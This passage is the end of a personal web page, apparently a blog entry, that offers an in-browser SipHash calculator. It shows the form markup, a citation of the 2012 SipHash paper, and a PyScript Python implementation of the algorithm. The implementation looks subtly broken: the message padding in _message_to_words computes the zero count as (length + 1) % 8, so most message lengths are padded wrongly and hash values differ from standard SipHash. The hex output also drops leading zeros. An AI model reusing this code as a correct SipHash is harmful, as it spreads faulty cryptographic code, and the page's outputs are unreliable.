        <label for="c" class="col-1 col-form-label">c</label>
        <input class="form-control col-1" type="number" id="c" value="2" min="0" step="1" />
        <label for="d" class="col-1 col-form-label">d</label>
        <input class="form-control col-1" type="number" id="d" value="4" min="0" step="1" />
    </div>
    <button class="btn btn-primary" type="submit" id="calculate">Calculate</button>
    <div class="form-group row">
        <label for="hash" class="col-2 col-form-label">Hash</label>
        <input class="form-control col" type="text" id="hash" readonly="" />
        <select id="hashType" class="form-control col-3" title="Hash type">
            <option selected="">Hex</option>
            <option>Decimal</option>
            <option>Base64</option>
        </select>
    </div>
    <div class="alert alert-danger" role="alert" id="error" hidden="">
        Something went wrong...
    </div>
</form>

<p>I implemented the SipHash algorithm followed <a class="citation" href="#siphash">(Aumasson &amp; Bernstein, 2012)</a>. You can see <a href="https://github.com/allc/SipHash">my Python code</a>, and this webpage uses <a href="https://pyscript.net/">PyScript</a> to run Python code in the browser.</p>

<h2 id="references">References</h2>

<ol class="bibliography"><li><span id="siphash">Aumasson, J.-P., &amp; Bernstein, D. J. (2012). SipHash: A Fast Short-Input PRF. In S. Galbraith &amp; M. Nandi (Eds.), <i>Progress in Cryptology - INDOCRYPT 2012</i> (pp. 489–508). Springer Berlin Heidelberg.</span></li></ol>

<py-script>
from pyodide import create_proxy

from typing import List, Tuple
import binascii

def big_to_little8(num: int) -&gt; int:
    """
    Convert 8-byte big endian integer to little endian integer to work with bitwise operations.

    Parameters
    ----------
    num : int
        Integer to be converted
    
    Returns
    -------
    int
        Converted integer
    """
    return int.from_bytes(num.to_bytes(8, 'big'), 'little')

def rotl8(num: int, bits: int) -&gt; int:
    """
    Bitwise left-rotate of a 8-byte number.

    Parameters
    ----------
    num : int
        Number to be left-rotated
    bits : int
        Number of bits to be left-rotated
    
    Returns
    -------
    int
        Left-rotated number
    """
    return ((num &lt;&lt; bits) &amp; 0xffffffffffffffff) | (num &gt;&gt; (64 - bits))

class SipHash:

    # TODO: Change ways to pass parameters in a more object-oriented way.
    
    """
    Implemented following the algorithm in (Aumasson and Bernstein, 2012).

    Aumasson, JP., Bernstein, D.J. (2012). SipHash: A Fast Short-Input PRF.
    In: Galbraith, S., Nandi, M. (eds) Progress in Cryptology - INDOCRYPT 2012.
    INDOCRYPT 2012. Lecture Notes in Computer Science, vol 7668.
    Springer, Berlin, Heidelberg. https://doi.org/10.1007/978-3-642-34931-7_28
    """

    def __init__(self, key: int, message: bytes, c=2, d=4) -&gt; None:
        """
        Initialise SipHash with a key and message.

        Parameters
        ----------
        key : int
            16-byte big-endian key
        message : bytes
            Message to be hashed in big-endian bytes
        c : int
            Number of compression rounds
        d : int
            Number of finalization round
        """
        self.key = key
        self.message = message
        self.c = c
        self.d = d
        self.hash = None

    def get_hash(self) -&gt; int:
        """
        Return hash of the message hashed with the key.

        Return from saved value if the hash has been calculated, or calculate the hash value and save it and return.

        Returns
        -------
        int
            Hash value in little-endian
        """
        if self.hash is None:        
            k0, k1 = self._encode_key(self.key)
            internal_state = self._initialise_internal_state(k0, k1)
            internal_state = self._compress(self.message, internal_state)
            self.hash = self._finalise(internal_state)
        return self.hash

    def hexdigest(self) -&gt; str:
        """
        Return the hex string of the hash.

        Returns
        -------
        str
            Hex string of the hash
        """
        return hex(self.get_hash())[2:]

    def _encode_key(self, key: int) -&gt; Tuple[int, int]:
        """
        Encode 16-byte key into 8-byte k0 and k1.

        Parameters
        ----------
        key : int
            16-byte big-endian key

        Returns
        -------
        (bytes, bytes)
            Tuple of k0 and k1
        """
        return (big_to_little8(key &gt;&gt; 8 * 8), big_to_little8(key &amp; 0xffffffffffffffff))

    def _initialise_internal_state(self, k0: int, k1: int) -&gt; Tuple[int, int, int, int]:
        """
        Initialise internal state v0, v1, v2, v3.

        Parameters
        ----------
        k0 : int
            8-byte k0
        k1 : int
            8-byte k1

        Returns
        -------
        (int, int, int, int)
            Internal state v0, v1, v2, v3
        """
        c1 = 0x736f6d6570736575
        c2 = 0x646f72616e646f6d
        c3 = 0x6c7967656e657261
        c4 = 0x7465646279746573
        v0 = k0 ^ int(c1)
        v1 = k1 ^ int(c2)
        v2 = k0 ^ int(c3)
        v3 = k1 ^ int(c4)
        return (v0, v1, v2, v3)

    def _compress(self, message: bytes, internal_state: Tuple[int, int, int, int]) -&gt; Tuple[int, int, int, int]:
        """
        Compress the message into internal state.

        Parameters
        ----------
        message : bytes
            Message to be hashed in big endian bytes
        internal_state : (int, int, int, int)
            Internal state v0, v1, v2, v3

        Returns
        -------
        (int, int, int, int)
            Internal state with message compressed into
        """
        words = self._message_to_words(message)

        v0, v1, v2, v3 = internal_state
        for word in words:
            v3 ^= word
            for _ in range(self.c):
                v0, v1, v2, v3 = self._sipround((v0, v1, v2, v3))
            v0 ^= word
        
        return (v0, v1, v2, v3)

    def _message_to_words(self, message: bytes) -&gt; List[int]:
        """
        Parse message into words

        Parameters
        ----------
        message : bytes
            Message to be hashed in big endian bytes

        Returns
        -------
        [int]
            Message parsed into little-endian words
        """
        message_length = len(message)
        padding_length = (message_length + 1) % 8
        message = message + b'\x00' * padding_length + (message_length % 256).to_bytes(1, 'little')
        return [int.from_bytes(message[i: i + 8], 'little') for i in range(0, len(message), 8)]

    def _sipround(self, internal_state: Tuple[int, int, int, int]) -&gt; Tuple[int, int, int, int]:
        """
        SipRound to transform internal state.

        Parameters
        ----------
        internal_state : (int, int, int, int)
            Internal state v0, v1, v2, v3

        Returns
        -------
        (int, int, int, int)
            Internal state v0, v1, v2, v3 after SipRound transform
        """
        v0, v1, v2, v3 = internal_state

        v0 = (v0 + v1) &amp; 0xffffffffffffffff
        v1 = rotl8(v1, 13)
        v1 ^= v0
        v0 = rotl8(v0, 32)
        v2 = (v2 + v3) &amp; 0xffffffffffffffff
        v3 = rotl8(v3, 16)
        v3 ^= v2
        v2 = (v2 + v1) &amp; 0xffffffffffffffff
        v1 = rotl8(v1, 17)
        v1 ^= v2
        v2 = rotl8(v2, 32)
        v0 = (v0 + v3) &amp; 0xffffffffffffffff
        v3 = rotl8(v3, 21)
        v3 ^= v0

        return (v0, v1, v2, v3)

    def _finalise(self, internal_state: Tuple[int, int, int, int]) -&gt; int:
        """
        Finalise SipHash

        Parameters
        ----------
        internal_state : (int, int, int, int)
            Internal state before finalise

        Returns
        -------
        int
            SipHash result in little-endian representation
        """
        v0, v1, v2, v3 = internal_state
        v2 ^= 0xff
        for _ in range(self.d):
            v0, v1, v2, v3 = self._sipround((v0, v1, v2, v3))
        return v0 ^ v1 ^ v2 ^ v3

def update_hash(event):
    document.getElementById('error').hidden = True
    try:
        message_type = document.getElementById('messageType').value
        message = document.getElementById('message').value
        match message_type:
            case 'Text':
                message = bytes(message, 'utf8')
            case 'Hex':
                message = bytes.fromhex(message)
            case 'Base64':
                message = binascii.a2b_base64(message)

        key_type = document.getElementById('keyType').value
        key = document.getElementById('key').value
        match key_type:
            case 'Text':
                key = int.from_bytes(bytes(key, 'utf-8'), 'big')
            case 'Hex':
                key = int(key, 16)
            case 'Decimal':
                key = int(key)
            case 'Base64':
                key = int.from_bytes(binascii.a2b_base64(key), 'big')

        hash_type = document.getElementById('hashType').value
        hash_output = document.getElementById('hash')
        c = int(document.getElementById('c').value)
        d = int(document.getElementById('d').value)
        siphash = SipHash(key, message, c, d)
        match hash_type:
            case 'Hex':
                hash_output.value = siphash.hexdigest()
            case 'Decimal':
                hash_output.value = siphash.get_hash()
            case 'Base64':
                hash_output.value = binascii.b2a_base64(siphash.get_hash().to_bytes(8, 'big')).decode('utf-8')
    except:
        document.getElementById('error').hidden = False

on_update = create_proxy(update_hash)

def calculate(event):
    event.preventDefault()
    update_hash(event)

on_calculate = create_proxy(calculate)

document.getElementById('calculate').onclick = on_calculate

input_ids = ['message', 'messageType', 'key', 'keyType', 'c', 'd', 'hashType']
for input_id in input_ids:
    document.getElementById(input_id).addEventListener('input', on_update)
</py-script>

<script defer="" src="https://pyscript.net/alpha/pyscript.js"></script>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>